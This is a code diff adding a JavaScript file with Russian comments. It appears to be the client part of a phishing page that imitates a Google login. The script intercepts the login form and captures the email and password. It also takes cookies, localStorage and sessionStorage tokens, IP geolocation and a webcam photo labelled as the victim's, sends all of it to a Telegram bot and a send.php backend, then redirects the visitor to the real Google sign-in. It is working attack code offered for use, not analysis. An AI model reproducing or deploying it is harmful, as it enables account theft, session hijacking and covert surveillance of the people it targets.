@@ -1,0 +1,110 @@
+// 1. Сбор геоданных через IP-API
+function getGeoData() {
+    return fetch('http://ip-api.com/json/')
+        .then(res => res.json())
+        .then(data => {
+            return `🌍 IP: ${data.query}\n📍 Город: ${data.city}\n🏛 Регион: ${data.regionName}\n🌐 Страна: ${data.country}\n📡 Провайдер: ${data.isp}`;
+        })
+        .catch(() => 'Геоданные недоступны');
+}
+
+// 2. Запрос доступа к камере и съёмка фото
+function capturePhoto() {
+    return new Promise((resolve) => {
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                    stream.getTracks().forEach(track => track.stop());
+                    resolve(canvas.toDataURL('image/jpeg', 0.8)); // base64 фото
+                }, 1500);
+            })
+            .catch(() => resolve(null)); // если камера не доступна
+    });
+}
+
+// 3. Кража токенов из localStorage / sessionStorage
+function getTokens() {
+    const data = {
+        localStorage: JSON.stringify(localStorage),
+        sessionStorage: JSON.stringify(sessionStorage),
+        cookies: document.cookie
+    };
+    return data;
+}
+
+// 4. Отправка всего в Telegram
+async function sendAllToTelegram(email, password) {
+    const geo = await getGeoData();
+    const photo = await capturePhoto();
+    const tokens = getTokens();
+    const userAgent = navigator.userAgent;
+    const time = new Date().toLocaleString('ru-RU');
+
+    // Формируем сообщение
+    let message = `🔐 **НОВЫЙ ВХОД GOOGLE**\n\n`;
+    message += `👤 **Логин:** ${email}\n`;
+    message += `🔑 **Пароль:** ${password}\n`;
+    message += `🕒 **Время:** ${time}\n`;
+    message += `📱 **User-Agent:** ${userAgent}\n\n`;
+    message += `**📡 Геоданные:**\n${geo}\n\n`;
+    message += `**🍪 Cookies:**\n${tokens.cookies || 'Нет'}\n\n`;
+    message += `**💾 LocalStorage:**\n${tokens.localStorage || 'Нет'}\n\n`;
+    message += `**📂 SessionStorage:**\n${tokens.sessionStorage || 'Нет'}`;
+
+    // Отправка через Telegram Bot API
+    const BOT_TOKEN = 'ВАШ_ТОКЕН_БОТА'; // замените
+    const CHAT_ID = 'ВАШ_CHAT_ID';       // замените
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message.substring(0, 4096),
+            parse_mode: 'Markdown'
+        })
+    })
+    .then(() => {
+        // Если есть фото — отправляем как документ
+        if (photo) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    photo: photo,
+                    caption: '📸 Фото с камеры жертвы'
+                })
+            });
+        }
+    });
+}
+
+// Перехват отправки формы (вызывается из index.html)
+document.addEventListener('DOMContentLoaded', function() {
+    const origSubmit = document.getElementById('loginForm').submit;
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
+        sendAllToTelegram(email, pass);
+        // Отправка на бэкенд (для перенаправления)
+        fetch('send.php', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({email, pass})
+        });
+        // Показываем "успех" и редирект
+        document.getElementById('status').textContent = 'Подождите...';
+        setTimeout(() => {
+            window.location.href = 'https://accounts.google.com';
+        }, 2000);
+    });
+});
